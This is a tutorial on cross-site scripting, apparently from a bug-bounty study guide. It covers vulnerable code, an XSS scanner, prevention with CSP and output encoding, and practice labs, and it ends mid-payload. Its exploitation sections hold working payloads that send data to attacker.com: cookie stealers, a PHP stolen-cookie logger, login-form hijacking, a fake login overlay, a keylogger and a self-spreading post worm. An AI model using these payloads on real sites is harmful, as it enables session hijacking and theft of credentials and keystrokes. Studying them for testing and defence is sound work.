# ⚡ Cross-Site Scripting (XSS) - Complete Guide

> **The most common web vulnerability - Master all types and advanced exploitation techniques**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of XSS](#types-of-xss)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

Cross-Site Scripting (XSS) is a client-side code injection attack where malicious scripts are injected into trusted websites. XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim's browser.

### 🔍 What Makes XSS Dangerous?
- **Session hijacking** - Steal authentication cookies
- **Credential theft** - Capture login credentials
- **Defacement** - Modify website content
- **Phishing attacks** - Redirect users to malicious sites
- **Malware distribution** - Execute malicious payloads
- **Privilege escalation** - Perform actions as the victim

### 📊 XSS Statistics
- **Found in 40%** of web applications during testing
- **Average bounty**: $500 - $3,000
- **Severity range**: Medium to High (depending on context)
- **Time to exploit**: Minutes once identified
- **Most reported vulnerability** on bug bounty platforms

## 🔬 Types of Cross-Site Scripting

### 1. 🔄 Reflected XSS (Non-Persistent)

The most common type where malicious script is reflected off a web server in an error message, search result, or any response that includes user input.

#### How Reflected XSS Works
```
1. Attacker crafts malicious URL with XSS payload
2. Victim clicks the malicious link
3. Server reflects the payload in the response
4. Browser executes the malicious script
5. Attacker gains access to victim's session/data
```

#### Example Vulnerable Code
```php
<?php
// Vulnerable PHP code
$search = $_GET['search'];
echo "You searched for: " . $search;
?>
```

#### Exploitation Example
```html
<!-- Original URL -->
https://vulnerable-site.com/search.php?search=test

<!-- Malicious URL -->
https://vulnerable-site.com/search.php?search=<script>alert('XSS')</script>

<!-- Server Response -->
You searched for: <script>alert('XSS')</script>
```

#### Advanced Reflected XSS Payloads
```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Session hijacking
<script>fetch('http://attacker.com/steal.php', {method:'POST', body:'cookie='+document.cookie})</script>

// Keylogger
<script>document.addEventListener('keypress', function(e) { fetch('http://attacker.com/keylog.php?key='+e.key); });</script>

// Form hijacking
<script>document.forms[0].action='http://attacker.com/steal.php';</script>
```

### 2. 💾 Stored XSS (Persistent)

The most dangerous type where malicious script is permanently stored on the target server (database, message forum, visitor log, comment field, etc.).

#### How Stored XSS Works
```
1. Attacker submits malicious script to vulnerable application
2. Application stores the script in database/file system
3. When other users view the affected page
4. Malicious script executes in their browsers
5. Attacker gains access to multiple victims' sessions
```

#### Example Vulnerable Code
```php
<?php
// Vulnerable comment system
if ($_POST['comment']) {
    $comment = $_POST['comment'];
    // Store in database without sanitization
    mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");
}

// Display comments
$result = mysqli_query($conn, "SELECT * FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['text'] . "</div>"; // XSS vulnerability
}
?>
```

#### Stored XSS Attack Scenarios
```html
<!-- Comment field injection -->
<script>
// Steal cookies from all users who view this comment
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- Profile field injection -->
<img src="x" onerror="
// Execute when profile is viewed
fetch('/admin/delete-user', {
    method: 'POST',
    headers: {'X-Requested-With': 'XMLHttpRequest'},
    body: 'user_id=123'
});
">

<!-- Forum post injection -->
<svg onload="
// Worm-like behavior - replicate to other posts
var xhr = new XMLHttpRequest();
xhr.open('POST', '/create-post', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('title=Infected&content=' + encodeURIComponent(document.documentElement.outerHTML));
">
```

### 3. 🌐 DOM-Based XSS

Occurs when the application's client-side script writes user-controllable data to the Document Object Model (DOM) in an unsafe way.

#### How DOM XSS Works
```
1. User input is processed by client-side JavaScript
2. Script writes data to DOM without proper sanitization
3. Browser interprets the data as executable code
4. Malicious script executes in the same origin context
```

#### Common DOM XSS Sinks
```javascript
// Dangerous DOM manipulation methods
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
element.onevent (onclick, onload, etc.)

// URL-based sources
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location.href
location.search
location.hash
location.pathname
```

#### DOM XSS Examples
```javascript
// Vulnerable code example 1
var search = document.location.search;
document.write("You searched for: " + search);

// Attack: https://site.com/page.html?search=<script>alert('XSS')</script>

// Vulnerable code example 2
var hash = document.location.hash;
document.getElementById('content').innerHTML = hash.substring(1);

// Attack: https://site.com/page.html#<img src=x onerror=alert('XSS')>

// Vulnerable code example 3
function updateProfile() {
    var name = document.getElementById('name').value;
    document.getElementById('profile').innerHTML = "Hello " + name;
}

// Attack: Input field contains <script>alert('XSS')</script>
```

#### Advanced DOM XSS Techniques
```javascript
// PostMessage XSS
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data; // Vulnerable
});

// Attack from iframe
parent.postMessage('<script>alert("XSS")</script>', '*');

// JSON parsing XSS
var data = JSON.parse(userInput);
document.getElementById('output').innerHTML = data.message; // Vulnerable

// Template literal XSS
var template = `Hello ${userInput}`; // Can be vulnerable
document.getElementById('greeting').innerHTML = template;

// Event handler XSS
element.setAttribute('onclick', userInput); // Dangerous
```

## 🔍 Detection Techniques

### 1. 🎯 Manual Detection

#### Basic XSS Test Payloads
```html
<!-- Simple alert tests -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Image-based tests -->
<img src=x onerror=alert('XSS')>
<img src="x" onerror="alert('XSS')">
<img/src="x"/onerror="alert('XSS')">

<!-- SVG-based tests -->
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
<svg onload="alert('XSS')"></svg>

<!-- Event handler tests -->
<body onload=alert('XSS')>
<div onclick=alert('XSS')>Click me</div>
<input onfocus=alert('XSS') autofocus>
```

#### Context-Specific Payloads
```html
<!-- HTML context -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

<!-- Attribute context -->
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
javascript:alert('XSS')

<!-- JavaScript context -->
';alert('XSS');//
';alert('XSS');var a='
</script><script>alert('XSS')</script>

<!-- CSS context -->
</style><script>alert('XSS')</script>
expression(alert('XSS'))
```

### 2. 🤖 Automated Detection

#### XSStrike - Advanced XSS Scanner
```bash
# Installation
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Basic usage
python3 xsstrike.py -u "https://target.com/search.php?q=test"

# POST request testing
python3 xsstrike.py -u "https://target.com/login.php" --data "username=admin&password=test"

# Custom headers
python3 xsstrike.py -u "https://target.com/api" --headers "Authorization: Bearer token"

# Crawling mode
python3 xsstrike.py -u "https://target.com" --crawl

# Advanced options
python3 xsstrike.py -u "https://target.com/search.php?q=test" --fuzzer --blind --skip-dom
```

#### Custom XSS Detection Script
```python
#!/usr/bin/env python3
"""
Advanced XSS Detection Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import random
import string

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # XSS payloads for different contexts
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                '<svg><script>alert&#40;\'XSS\'&#41;</script>',
                '<script>eval(atob("YWxlcnQoJ1hTUycpOw=="))</script>',
                '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycpOw=="))>',
                '<script>window["alert"]("XSS")</script>',
                '<script>top["alert"]("XSS")</script>'
            ],
            'dom_based': [
                '#<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                'data:text/html,<script>alert("XSS")</script>'
            ]
        }
    
    def generate_unique_payload(self):
        """Generate unique payload for detection"""
        unique_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f'<script>alert("XSS_{unique_id}")</script>', unique_id
    
    def test_reflected_xss(self, url, params):
        """Test for reflected XSS vulnerabilities"""
        for param in params:
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        
                        if payload in response.text:
                            self.vulnerabilities.append({
                                'type': 'Reflected XSS',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'category': category,
                                'severity': 'High',
                                'evidence': payload in response.text
                            })
                            
                    except Exception as e:
                        continue
    
    def test_stored_xss(self, form_url, form_data):
        """Test for stored XSS vulnerabilities"""
        unique_payload, unique_id = self.generate_unique_payload()
        
        # Submit payload
        test_data = form_data.copy()
        for field in test_data:
            if 'comment' in field.lower() or 'message' in field.lower() or 'content' in field.lower():
                test_data[field] = unique_payload
                break
        
        try:
            # Submit the form
            self.session.post(form_url, data=test_data, timeout=10)
            
            # Check if payload is stored and executed
            response = self.session.get(form_url, timeout=10)
            
            if unique_payload in response.text:
                self.vulnerabilities.append({
                    'type': 'Stored XSS',
                    'url': form_url,
                    'payload': unique_payload,
                    'unique_id': unique_id,
                    'severity': 'Critical',
                    'evidence': unique_payload in response.text
                })
                
        except Exception as e:
            pass
    
    def test_dom_xss(self, url):
        """Test for DOM-based XSS vulnerabilities"""
        dom_payloads = self.payloads['dom_based']
        
        for payload in dom_payloads:
            test_url = f"{url}#{payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # Check for DOM manipulation patterns
                dom_patterns = [
                    r'document\.write\s*\(',
                    r'\.innerHTML\s*=',
                    r'\.outerHTML\s*=',
                    r'document\.location',
                    r'window\.location'
                ]
                
                for pattern in dom_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'Potential DOM XSS',
                            'url': test_url,
                            'payload': payload,
                            'pattern': pattern,
                            'severity': 'Medium',
                            'note': 'Manual verification required'
                        })
                        
            except Exception as e:
                continue
    
    def find_forms(self, url):
        """Find forms on the page for testing"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {}
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                if action:
                    form_url = urljoin(url, action)
                else:
                    form_url = url
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name:
                        input_type = input_tag.get('type', 'text')
                        if input_type not in ['submit', 'button', 'reset']:
                            form_data[name] = 'test'
                
                if form_data:
                    forms.append({
                        'url': form_url,
                        'method': method,
                        'data': form_data
                    })
            
            return forms
            
        except Exception as e:
            return []
    
    def scan(self):
        """Run comprehensive XSS scan"""
        print(f"[+] Starting XSS scan for {self.target_url}")
        
        # Test reflected XSS
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            from urllib.parse import parse_qs
            params = parse_qs(parsed_url.query)
            params = {k: v[0] for k, v in params.items()}
            self.test_reflected_xss(self.target_url, params)
        
        # Find and test forms
        forms = self.find_forms(self.target_url)
        for form in forms:
            if form['method'] == 'post':
                self.test_stored_xss(form['url'], form['data'])
            else:
                self.test_reflected_xss(form['url'], form['data'])
        
        # Test DOM XSS
        self.test_dom_xss(self.target_url)
        
        return self.vulnerabilities

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output file")
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url)
    vulnerabilities = scanner.scan()
    
    if vulnerabilities:
        print(f"\n[+] Found {len(vulnerabilities)} potential XSS vulnerabilities:")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln.get('parameter', 'N/A')} in {vuln['url']}")
    else:
        print("\n[-] No XSS vulnerabilities found")
    
    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump(vulnerabilities, f, indent=2)

if __name__ == "__main__":
    main()
```

## ⚔️ Exploitation Methods

### 1. 🍪 Session Hijacking

#### Cookie Stealing Techniques
```javascript
// Basic cookie stealing
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

// Fetch API method (modern browsers)
<script>
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: 'cookie=' + document.cookie
});
</script>

// Image-based exfiltration
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>

// XMLHttpRequest method
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookie=' + encodeURIComponent(document.cookie));
</script>
```

#### Server-Side Cookie Stealer (PHP)
```php
<?php
// steal.php - Cookie stealing server
if (isset($_GET['cookie']) || isset($_POST['cookie'])) {
    $cookie = $_GET['cookie'] ?? $_POST['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    $log_entry = "[$timestamp] IP: $ip | Cookie: $cookie | UA: $user_agent\n";
    file_put_contents('stolen_cookies.txt', $log_entry, FILE_APPEND);
    
    // Return 1x1 pixel image to avoid suspicion
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
```

### 2. 🎣 Credential Harvesting

#### Login Form Hijacking
```javascript
// Hijack login form submission
<script>
// Wait for form submission
document.addEventListener('DOMContentLoaded', function() {
    var loginForm = document.querySelector('form[action*="login"]') || 
                   document.querySelector('form input[type="password"]').closest('form');
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            // Capture credentials
            var formData = new FormData(loginForm);
            var credentials = {};
            
            for (var pair of formData.entries()) {
                credentials[pair[0]] = pair[1];
            }
            
            // Send to attacker server
            fetch('http://attacker.com/harvest.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(credentials)
            });
        });
    }
});
</script>
```

#### Fake Login Overlay
```javascript
// Create fake login overlay
<script>
function createFakeLogin() {
    // Create overlay
    var overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;
    
    // Create fake login form
    overlay.innerHTML = `
        <div style="background: white; padding: 20px; border-radius: 5px; width: 300px;">
            <h3>Session Expired - Please Login Again</h3>
            <form id="fakeLogin">
                <input type="text" placeholder="Username" id="fakeUser" style="width: 100%; margin: 5px 0; padding: 10px;">
                <input type="password" placeholder="Password" id="fakePass" style="width: 100%; margin: 5px 0; padding: 10px;">
                <button type="submit" style="width: 100%; padding: 10px; background: #007cba; color: white; border: none;">Login</button>
            </form>
        </div>
    `;
    
    document.body.appendChild(overlay);
    
    // Handle form submission
    document.getElementById('fakeLogin').addEventListener('submit', function(e) {
        e.preventDefault();
        var username = document.getElementById('fakeUser').value;
        var password = document.getElementById('fakePass').value;
        
        // Send credentials to attacker
        fetch('http://attacker.com/harvest.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username: username, password: password})
        }).then(() => {
            overlay.remove();
            alert('Login failed. Please try again.');
        });
    });
}

// Execute after page loads
setTimeout(createFakeLogin, 2000);
</script>
```

### 3. 🔑 Keylogging

#### Advanced Keylogger
```javascript
// Comprehensive keylogger
<script>
var keylog = '';
var mouseLog = [];

// Capture keystrokes
document.addEventListener('keydown', function(e) {
    var key = e.key;
    var timestamp = new Date().toISOString();
    
    // Special keys
    if (key === 'Enter') key = '[ENTER]';
    else if (key === 'Tab') key = '[TAB]';
    else if (key === 'Backspace') key = '[BACKSPACE]';
    else if (key === ' ') key = '[SPACE]';
    
    keylog += key;
    
    // Send keylog every 50 characters or on Enter
    if (keylog.length > 50 || key === '[ENTER]') {
        sendKeylog();
    }
});

// Capture form focus events
document.addEventListener('focusin', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        keylog += `[FOCUS:${e.target.name || e.target.id || e.target.type}]`;
    }
});

// Capture mouse clicks on sensitive elements
document.addEventListener('click', function(e) {
    if (e.target.type === 'submit' || e.target.tagName === 'BUTTON') {
        keylog += `[CLICK:${e.target.innerText || e.target.value}]`;
        sendKeylog();
    }
});

function sendKeylog() {
    if (keylog.length > 0) {
        fetch('http://attacker.com/keylog.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'keylog=' + encodeURIComponent(keylog) + '&url=' + encodeURIComponent(window.location.href)
        });
        keylog = '';
    }
}

// Send remaining keylog when page unloads
window.addEventListener('beforeunload', sendKeylog);
</script>
```

### 4. 🎭 Social Engineering Attacks

#### Fake Security Alert
```javascript
// Create convincing security alert
<script>
function showSecurityAlert() {
    var alertDiv = document.createElement('div');
    alertDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #ff4444;
        color: white;
        padding: 15px;
        border-radius: 5px;
        z-index: 10000;
        max-width: 300px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    `;
    
    alertDiv.innerHTML = `
        <strong>⚠️ Security Alert</strong><br>
        Suspicious activity detected on your account.<br>
        <a href="http://attacker.com/verify.php?token=${document.cookie}" 
           style="color: #ffff00; text-decoration: underline;">
           Click here to verify your account
        </a>
        <button onclick="this.parentElement.remove()" style="float: right; background: none; border: none; color: white; cursor: pointer;">×</button>
    `;
    
    document.body.appendChild(alertDiv);
    
    // Auto-remove after 10 seconds
    setTimeout(() => alertDiv.remove(), 10000);
}

// Show alert after 3 seconds
setTimeout(showSecurityAlert, 3000);
</script>
```

## 🚀 Advanced XSS Techniques

### 1. 🛡️ Filter Bypass Techniques

#### Encoding Bypasses
```javascript
// HTML entity encoding
&lt;script&gt;alert('XSS')&lt;/script&gt;

// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Double URL encoding
%253Cscript%253Ealert('XSS')%253C/script%253E

// Unicode encoding
\u003cscript\u003ealert('XSS')\u003c/script\u003e

// Hex encoding
<script>alert(String.fromCharCode(88,83,83))</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>

// Octal encoding
<script>alert('\130\123\123')</script>
```

#### Case Variation and Obfuscation
```javascript
// Mixed case
<ScRiPt>alert('XSS')</ScRiPt>

// Alternative tags
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">

// Event handler variations
<div onclick=alert('XSS')>
<div onmouseover=alert('XSS')>
<div onfocus=alert('XSS') tabindex=1>
<div onload=alert('XSS')>

// JavaScript alternatives
<script>window['alert']('XSS')</script>
<script>top['alert']('XSS')</script>
<script>self['alert']('XSS')</script>
<script>parent['alert']('XSS')</script>
```

#### WAF Bypass Techniques
```javascript
// Comment-based bypasses
<script>/**/alert('XSS')</script>
<script>alert/**/('XSS')</script>
<script>alert(/**/'XSS')</script>

// Whitespace variations
<script>alert('XSS')</script>
<script	>alert('XSS')</script>
<script
>alert('XSS')</script>

// Attribute variations
<img/src=x/onerror=alert('XSS')>
<img src="x"onerror="alert('XSS')">
<img src='x'onerror='alert("XSS")'>

// Protocol variations
<iframe src="javascript:alert('XSS')">
<iframe src="data:text/html,<script>alert('XSS')</script>">
<iframe src="vbscript:msgbox('XSS')">
```

### 2. 🎯 Context-Specific Bypasses

#### HTML Attribute Context
```javascript
// Breaking out of attributes
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
" autofocus onfocus="alert('XSS')
' autofocus onfocus='alert('XSS')

// JavaScript protocol
javascript:alert('XSS')
javascript:void(alert('XSS'))
javascript:void(0);alert('XSS')

// Data URLs
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

#### JavaScript String Context
```javascript
// Breaking out of strings
';alert('XSS');//
';alert('XSS');var a='
\';alert(\'XSS\');//
\";alert(\"XSS\");//

// Template literals
${alert('XSS')}
`${alert('XSS')}`

// Function calls
alert('XSS')
eval('alert("XSS")')
setTimeout('alert("XSS")',0)
setInterval('alert("XSS")',1000)
```

#### CSS Context
```css
/* CSS injection */
</style><script>alert('XSS')</script>
expression(alert('XSS'))
-moz-binding:url("data:text/xml,<bindings xmlns='http://www.mozilla.org/xbl'><binding><implementation><constructor>alert('XSS')</constructor></implementation></binding></bindings>")

/* CSS with JavaScript */
background-image: url("javascript:alert('XSS')")
```

### 3. 🔄 Advanced DOM Manipulation

#### Mutation XSS
```javascript
// Exploiting DOM mutations
<svg><script>alert('XSS')</script></svg>
<math><script>alert('XSS')</script></math>
<table><script>alert('XSS')</script></table>

// mXSS with innerHTML
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
```

#### PostMessage XSS
```javascript
// Vulnerable postMessage handler
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});

// Attack from iframe
<iframe src="javascript:parent.postMessage('<img src=x onerror=alert(document.domain)>','*')">
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 Input Validation and Sanitization

#### Server-Side Input Validation
```php
// PHP input sanitization
function sanitizeInput($input) {
    // Remove HTML tags
    $input = strip_tags($input);
    
    // Encode HTML entities
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    
    // Additional filtering
    $input = preg_replace('/[<>"\']/', '', $input);
    
    return $input;
}

// Usage
$userInput = sanitizeInput($_POST['comment']);
```

```python
# Python input sanitization
import html
import re
from bleach import clean

def sanitize_input(user_input):
    # HTML escape
    sanitized = html.escape(user_input)
    
    # Remove dangerous patterns
    sanitized = re.sub(r'javascript:', '', sanitized, flags=re.IGNORECASE)
    sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
    
    return sanitized

# Using bleach library for advanced sanitization
def advanced_sanitize(user_input):
    allowed_tags = ['p', 'br', 'strong', 'em']
    allowed_attributes = {}
    
    return clean(user_input, tags=allowed_tags, attributes=allowed_attributes)
```

#### Client-Side Validation (Defense in Depth)
```javascript
// JavaScript input validation
function validateInput(input) {
    // Basic XSS pattern detection
    const xssPatterns = [
        /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi
    ];
    
    for (let pattern of xssPatterns) {
        if (pattern.test(input)) {
            return false;
        }
    }
    
    return true;
}

// DOM-safe content insertion
function safeInsertHTML(element, content) {
    // Use textContent instead of innerHTML
    element.textContent = content;
    
    // Or use DOMPurify for HTML content
    if (typeof DOMPurify !== 'undefined') {
        element.innerHTML = DOMPurify.sanitize(content);
    }
}
```

### 2. 🔐 Content Security Policy (CSP)

#### Comprehensive CSP Implementation
```html
<!-- Strict CSP header -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
">
```

#### Progressive CSP Implementation
```javascript
// Level 1: Report-only mode
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// Level 2: Basic protection
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

// Level 3: Strict protection
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

// Level 4: Nonce-based protection
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

### 3. 🛡️ Output Encoding

#### Context-Aware Output Encoding
```php
// PHP context-aware encoding
class OutputEncoder {
    public static function htmlEncode($data) {
        return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
    
    public static function jsEncode($data) {
        return json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
    }
    
    public static function cssEncode($data) {
        return preg_replace('/[^a-zA-Z0-9]/', '\\\\$0', $data);
    }
    
    public static function urlEncode($data) {
        return urlencode($data);
    }
}

// Usage examples
echo OutputEncoder::htmlEncode($userInput); // HTML context
echo 'var data = ' . OutputEncoder::jsEncode($userInput) . ';'; // JavaScript context
echo 'color: ' . OutputEncoder::cssEncode($userColor) . ';'; // CSS context
echo 'redirect.php?url=' . OutputEncoder::urlEncode($userUrl); // URL context
```

### 4. 🔒 Secure Coding Practices

#### Template Security
```javascript
// Secure templating with escaping
// Bad
element.innerHTML = `Hello ${userName}`;

// Good
element.textContent = `Hello ${userName}`;

// Or with proper escaping
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
element.innerHTML = `Hello ${escapeHtml(userName)}`;
```

#### Safe DOM Manipulation
```javascript
// Safe DOM methods
// Instead of innerHTML
element.textContent = userInput;
element.innerText = userInput;

// Instead of document.write
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

// Safe attribute setting
element.setAttribute('title', userInput); // Still needs validation
element.dataset.userValue = userInput; // Safer for data attributes
```

## 🧪 Practice Labs

### 1. 🎓 Beginner Labs

#### PortSwigger Web Security Academy - XSS Labs
```
1. Reflected XSS into HTML context with nothing encoded
2. Stored XSS into HTML context with nothing encoded
3. DOM XSS in document.write sink using source location.search
4. DOM XSS in innerHTML sink using source location.search
5. DOM XSS in jQuery anchor href attribute sink using location.search source
```

#### DVWA XSS Challenges
```bash
# Setup DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# XSS Challenges:
# Low Security: Basic XSS injection
# Medium Security: Simple filter bypass
# High Security: Advanced filter evasion
```

### 2. 🔬 Intermediate Labs

#### XSS Game by Google
```
https://xss-game.appspot.com/

Levels:
1. Hello, world of XSS
2. Persistence is key
3. That sinking feeling...
4. Context matters
5. Breaking protocol
6. Follow the 🐰
```

#### Prompt.ml XSS Challenges
```
https://prompt.ml/

Advanced XSS challenges:
- Filter bypass techniques
- Context-specific exploitation
- Advanced payload construction
```

### 3. 🚀 Advanced Labs

#### Custom XSS Lab Setup
```html
<!-- vulnerable-app.php -->
<!DOCTYPE html>
<html>
<head>
    <title>XSS Practice Lab</title>
</head>
<body>
    <h1>XSS Practice Lab</h1>
    
    <!-- Reflected XSS -->
    <h2>Search</h2>
    <form method="GET">
        <input type="text" name="search" value="<?php echo $_GET['search'] ?? ''; ?>">
        <input type="submit" value="Search">
    </form>
    <p>You searched for: <?php echo $_GET['search'] ?? ''; ?></p>
    
    <!-- Stored XSS -->
    <h2>Comments</h2>
    <form method="POST">
        <textarea name="comment" placeholder="Leave a comment"></textarea>
        <input type="submit" value="Post Comment">
    </form>
    
    <?php
    if ($_POST['comment']) {
        file_put_contents('comments.txt', $_POST['comment'] . "\n", FILE_APPEND);
    }
    
    if (file_exists('comments.txt')) {
        $comments = file('comments.txt');
        foreach ($comments as $comment) {
            echo "<div>$comment</div>";
        }
    }
    ?>
    
    <!-- DOM XSS -->
    <h2>Welcome Message</h2>
    <script>
        var name = new URLSearchParams(window.location.search).get('name');
        if (name) {
            document.write('Welcome ' + name + '!');
        }
    </script>
</body>
</html>
```

## 🌍 Real-World Examples

### 1. 💰 High-Value Bug Bounty Reports

#### Facebook Stored XSS ($15,000)
- **Vulnerability**: Stored XSS in Facebook Pages
- **Vector**: Image upload with malicious filename
- **Impact**: Account takeover for page administrators
- **Payload**: `"><script>alert(document.cookie)</script>.jpg`
- **Key Learning**: File upload fields are often overlooked

#### Google Reflected XSS ($7,500)
- **Vulnerability**: XSS in Google Search results
- **Vector**: Malformed search query with special characters
- **Impact**: Session hijacking and credential theft
- **Technique**: URL encoding bypass
- **Key Learning**: Even simple reflections can be valuable

#### Twitter DOM XSS ($5,000)
- **Vulnerability**: DOM XSS in Twitter's mobile interface
- **Vector**: Malicious hashtag processing
- **Impact**: Tweet on behalf of victims
- **Technique**: PostMessage exploitation
- **Key Learning**: Mobile interfaces often have different security controls

### 2. 🏢 Enterprise Breaches

#### Samy Worm (MySpace, 2005)
```javascript
// Simplified version of the Samy worm
var xmlHttp = new XMLHttpRequest();
xmlHttp.open('POST', '/index.cfm?fuseaction=user.viewProfile', true);
xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xmlHttp.send('friendID=11851658&submit=Add to Friends');

// Self-replication
var div = document.createElement('div');
div.innerHTML = 'but most of all, samy is my hero';
document.body.appendChild(div);
```

### 3. 📊 Common XSS Patterns in Bug Bounty

#### Search Functionality
```javascript
// Common vulnerable pattern
https://target.com/search?q=<script>alert('XSS')</script>

// Advanced exploitation
https://target.com/search?q=<script>fetch('/api/user/me').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(d)}))</script>
```

#### User Profile Fields
```html
<!-- Bio field XSS -->
<img src=x onerror="
var xhr = new XMLHttpRequest();
